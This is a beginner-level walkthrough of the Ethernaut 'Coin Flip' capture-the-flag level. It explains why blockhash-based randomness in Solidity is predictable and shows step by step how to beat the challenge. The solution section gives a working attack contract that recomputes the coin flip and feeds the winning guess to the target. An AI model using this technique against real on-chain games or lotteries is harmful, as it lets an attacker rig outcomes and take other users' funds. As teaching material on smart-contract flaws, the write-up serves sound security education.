# Ethernaut - Walkthrough for Noobs - 3 - Coin Flip

The solution to this challenge is fairly easy, however, it introduces an extremely crucial topic in the blockchain which we usually take for granted otherwise. As always, I will break down the concepts and give you all the tools to solve the problem 100% on your own and then provide my solution.

With that being said let's begin.

> Objectives:
> 
> This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

### Background

If you are familiar with any programming language, you must have come across a function called `random` in some form or the other.

In Javascript for example:

```javascript
var random = Math.random();
console.log("Random Number Generated : " + random); 

//This will generate a random float between 0(inclusive) and 1(exclusive).
```

But no such function exists in Solidity. Why is that?

This is because in the true sense of the word Ethereum is a [Deterministic Finite Machine](https://www.tutorialspoint.com/automata_theory/deterministic_finite_automaton.htm). All transactions on the Ethereum blockchain are deterministic state transition operations i.e. for each input we can determine which state the machine will be in. This is not an inherent flaw per se but a trade-off we make for an extremely important thing: **Consensus.**

If the above sounds like jargon to you, it simply means:

* All nodes have the same copy of the code.
    
* All nodes run it in exactly the same manner.
    
* Thus, they must exactly arrive at the same state.
    

Read more [here](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#entropy-illusion).

Thus, we can confidently say that on-chain randomness is not possible. However, what we truly want is not randomness but unpredictability. We want a number that might not be truly random but extremely difficult to predict till it is released.

There are a few [solutions](https://ethereum.stackexchange.com/questions/191/how-can-i-securely-generate-a-random-number-in-my-smart-contract) and workarounds to this problem, such as RANDAO, Commit Reveal Techniques, and the use of Oracles.

### Problems and Code of Importance

This leads people to try to create sort of seemingly random numbers in their contracts which are not really random and can be replicated. Since smart contracts in the same block will have the same value and thus the same random number. Some common pitfalls are using the block context variables such as block hashes, difficulty, gas limit, etc.

The way to attack this is to create another smart contract with the same code to generate the random number.

Coming back to the Coin Flip Challenge, the following code is of importance to us and should be the focal point of our attack.

```solidity
//We have 3 state variables
uint256 public consecutiveWins; //counts how many consecutive wins we have. 
uint256 lastHash; //updated by the flip() function.
//FACTOR is largest integer possible in solidity divided by 2.
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```

I will try to explain the code in the comments.

```solidity
//this function basically takes a boolean representing the side of the coin and returns a boolean indicating whether the caller won or not.  
  function flip(bool _guess) public returns (bool) { 
//block.number and blockhash are global variables, we can never know the block values of the block currently being mined, therefore we are using -1 here. 
    uint256 blockValue = uint256(blockhash(block.number - 1));
//revert() is used so that we cannot call flip multiple times in the same block, and will actually have to predict the flip every single time. 
    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
//coinFlip would either be 0 or 1, since Factor is Max_int/2 and there are equal numbers above and below Factor. 
    uint256 coinFlip = blockValue / FACTOR;
//if coinFlip is 1 return true else return false. Essentially a 50-50 chance. 
    bool side = coinFlip == 1 ? true : false;
//this line of code just updates consecutiveWins. 
    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
```

Now if you realize that the "randomness" created in this block is not truly random and you can just calculate `_guess` in another function by creating another contract with the same parameter and feeding the solution in this contract. The problem is solved.

### Solution

1. Open the Remix IDE [here](http://remix.ethereum.org). We need to write an attack code.
    
2. Copy and paste the Coinflip contract into a file and name it `coinflip.sol`
    
3. Create another file and name it anything, I have named it `attack.sol`
    
4. Generate a new instance and copy the contract address.
    
5. Make sure you are not on a VM.
    
6. Copy the following code in `attack.sol`
    

```solidity
import './CoinFlip.sol';

contract CoinFlipAttack{
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
     address instanceAddress = "Your Instance Address, without the Quotes" ;
   //creates a variable of type CoinFlip pointing to our instanceAddress
     CoinFlip public originalContract = CoinFlip(instanceAddress);
   //same code to generate same result. 
     function coinAttack() public {
       uint256 blockValue = uint256(blockhash(block.number - 1));
       uint256 coinFlip = blockValue/FACTOR;
       bool side = coinFlip == 1 ? true : false;
   //calling the flip function in the contract and feeding it our solution.    
       originalContract.flip(side);
     }
   
 }
```

1. Make sure to deploy both `attack.sol` and `coinflip.sol` in Remix.
    
2. Now call the `coinAttack()` function 10 times, to pass the stage.
    
3. Make sure that `consecutiveWins()` is increasing by putting this in your console.
    
    ```javascript
    await contract.consecutiveWins()
    ```
    
    Side Quest: Doing this 10 times is a slightly cumbersome process, is there any way we can automate this?
    
    I will probably do this using python in some form later, let me know if you would want the automated version as well.
    

CoinFlip✅